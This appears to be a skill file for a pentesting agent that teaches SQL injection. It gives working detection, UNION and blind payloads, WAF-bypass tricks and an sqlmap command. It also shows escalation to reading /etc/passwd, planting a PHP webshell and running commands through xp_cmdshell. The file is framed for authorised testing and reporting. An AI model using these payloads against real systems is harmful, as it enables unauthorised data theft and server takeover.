---
name: web-sqli
description: >
  Detect and exploit SQL injection (error-based, UNION, boolean/time blind, stacked). Load
  when a param feeds a query, you see DB errors, numeric/string params change result sets,
  login forms, search, sort/order-by, or ORM raw queries. Signals: "id=", 500 on a quote,
  "You have an error in your SQL syntax", MySQL/Postgres/MSSQL/Oracle banners.
domain: web
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: critical
owasp: [A03:2021-Injection]
cwe: [CWE-89]
tools: [sqlmap, burp, ghauri]
schema_version: 1
---

# SQL Injection (SQLi)

## When it applies
User input is concatenated into a SQL query. Test every param, header (`X-Forwarded-For`,
`User-Agent`, `Referer` sometimes logged into DB), cookie, and JSON field — not just `?id=`.

## Why it works
The query string mixes code and data. A stray quote/operator lets you close the intended
literal and append your own SQL, which the engine parses as instructions. Blind variants
leak data one bit at a time via truthy/falsy responses or timing.

## Method
> **Exact per-DB payloads, blind/error/time variants, and WAF bypasses:** see
> [`cheatsheet.md`](cheatsheet.md) next to this file. Work the *whole* variation set for a
> parameter before concluding it isn't injectable — one failed quote is not a clean param.

1. **Detect** — send `'`, `"`, `)`, then a self-true vs self-false pair:
   `id=1 AND 1=1` vs `id=1 AND 1=2` (numeric); `x' AND '1'='1` vs `x' AND '1'='2` (string).
   Different responses = injectable. Error text = fast win; identical = try blind/time.
2. **Fingerprint the DB** (comment style, string concat, version fn) then pick a technique:
   - **UNION**: find column count (`ORDER BY n` until error), find a string-typed column, then
     `UNION SELECT NULL,version(),NULL-- -` and pull `information_schema`.
   - **Boolean-blind**: `AND SUBSTRING((SELECT ...),1,1)='a'` — automate the oracle.
   - **Time-blind**: `AND SLEEP(5)` / `pg_sleep(5)` / `WAITFOR DELAY '0:0:5'` when no visible diff.
3. **Escalate beyond data** where the DB privileges allow:
   - **File read** (MySQL `FILE` priv): `UNION SELECT LOAD_FILE('/etc/passwd')` — read app source,
     keys, config to find the next bug.
   - **File write → webshell**: `... INTO OUTFILE '/var/www/html/s.php'` (needs `FILE`, a writable
     path, and `secure_file_priv` unset). MSSQL `xp_cmdshell` / Postgres `COPY ... FROM PROGRAM`
     give direct command execution when you're DBA.
4. **Automate** once confirmed: `sqlmap -r req.txt --batch --level 3 --risk 2 --dbms=mysql`
   (`-r` = saved Burp request preserves auth/headers; raise level/risk only after manual proof).

## Gotchas
- WAF blocks `union select` → try inline comments `un/**/ion`, case, or `sqlmap --tamper`.
- Numeric context needs no quotes; quoting it makes a real vuln look dead.
- `sqlmap` on the raw URL misses auth/CSRF — always feed it a captured request (`-r`).
- Second-order: input stored now, executed in a later query elsewhere — test the *read* path.

## Verify success
Extract a harmless proof: `@@version`, `current_user`, `database()`, or one row from a
non-sensitive table. For a report, show the version string, not customer data.

## References
PortSwigger SQLi labs; sqlmap wiki; OWASP SQLi Prevention Cheat Sheet.
